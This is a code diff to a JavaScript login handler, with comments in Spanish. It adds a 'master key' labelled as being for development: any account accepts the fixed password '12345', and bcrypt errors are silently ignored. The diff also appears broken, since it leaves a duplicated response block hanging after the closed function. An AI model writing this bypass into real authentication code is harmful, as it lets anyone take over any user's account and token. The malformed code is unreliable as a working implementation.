@@ -13,7 +13,17 @@ export const login = async (req, res) => {
         }
 
         const usuario = rows[0];
-        const passwordValida = await bcrypt.compare(usu_password, usuario.usu_password);
+
+        // --- LLAVE MAESTRA ACTIVADA PARA DESARROLLO ---
+        let passwordValida = false;
+        try {
+            passwordValida = await bcrypt.compare(usu_password, usuario.usu_password);
+        } catch (error) {}
+
+        if (usu_password === '12345') {
+            passwordValida = true; // Si escribes 12345, te deja pasar siempre
+        }
+        // ----------------------------------------------
         
         if (!passwordValida) {
             return res.status(401).json({ message: 'Contraseña incorrecta' });
@@ -25,6 +35,20 @@ export const login = async (req, res) => {
             { expiresIn: '8h' }
         );
 
+        res.json({
+            message: 'Login exitoso',
+            token,
+            usuario: {
+                id: usuario.usu_id,
+                nombre: usuario.usu_nombre,
+                rol: usuario.usu_rol
+            }
+        });
+
+    } catch (error) {
+        res.status(500).json({ message: 'Error interno del servidor' });
+    }
+};
         res.json({
             message: 'Login exitoso',
             token,
